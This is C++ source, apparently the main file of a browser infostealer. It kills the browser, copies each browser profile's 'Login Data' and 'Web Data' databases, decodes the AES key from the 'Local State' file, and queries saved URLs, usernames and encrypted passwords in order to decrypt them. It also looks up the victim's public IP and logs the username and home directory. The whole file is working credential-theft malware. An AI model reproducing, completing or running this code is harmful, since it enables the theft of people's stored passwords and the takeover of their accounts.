#include "../ext/includes.h"

// Magic chatGPT callback for curl
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userData) {
    size_t totalSize = size * nmemb;
    userData->append((char*)contents, totalSize);
    return totalSize;
}

// Function to read file with UTF-8 encoding --TY CHAT GPT
std::string read_file_utf8(const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary); // Open in binary mode
    if (!file) {
        logger::log(logger::error, "Error opening file.");
        //we have to return a string. so just return an empty one on failure 
        return "";
    }

    // Read file content into a vector of chars
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();

    // Convert the vector of chars to a UTF-8 string
    return std::string(buffer.begin(), buffer.end());
}

//Get current public IP address using curl and ipify.org
std::string get_ip() {
    //setup curl
    CURL* curl = curl_easy_init();
    CURLcode res;
    std::string return_ip;

    //define what to do
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://api.ipify.org/");  // Set the URL
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);   // Set callback function
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &return_ip);         // Pass string to store response

        //perform action (send request)
        res = curl_easy_perform(curl);

        //log errors if any.
        if (res != CURLE_OK) {
            logger::log(logger::error, "Some error occured: %s", curl_easy_strerror(res));
        }


        //ALWAYS CLEANUP!
        curl_easy_cleanup(curl);
    }
    else {
        printf("curl no worky. \n");
    }
    //return public IP for later use. (LOL)
    return return_ip;

}


void log_info() {
    logger::log(logger::info, "IP: %s ", definitions::ip.c_str());
    logger::log(logger::info, "Username: %s", definitions::username.c_str());
    logger::log(logger::info, "home directory: %s ", definitions::home.c_str());
    logger::log(logger::info, "browser directory: %s ", definitions::browser.c_str());
    logger::log(logger::info, "local state file: %s ", definitions::localstate_path.c_str());
}

int main() {

    definitions::initialize();
    kill_browser(definitions::browser_proccess);

    for (const auto& [browser_Name, browser_Path] : definitions::browser_paths) {
        logger::log(logger::info, "stealing browser: %s", browser_Name.c_str());
        definitions::browser = browser_Path;
        definitions::localstate_path = browser_Path + "Local State";
        definitions::localstate_content = read_file_utf8(definitions::localstate_path);

        try
        {

            steal_db(definitions::browser + "Default\\Login Data");
            steal_db(definitions::browser + "Default\\Web Data");
            get_ip();
            json localstate_json = read_local_state();
            check_json(localstate_json);

            //use AES key to later decrypt further.
            std::vector<BYTE> aeskey = decrypt_utils::decode_key(definitions::encoded_key_str);
            retrieve_DB(definitions::browser + "Default\\Login Data.db", "SELECT origin_url, username_value, password_value from LOGINS", aeskey);

        }
        catch (const std::exception& e)
        {
            logger::log(logger::error, "Some error occured, %s", e.what());
        }
    }

    log_info();
    std::cin.get();
	return 0;
}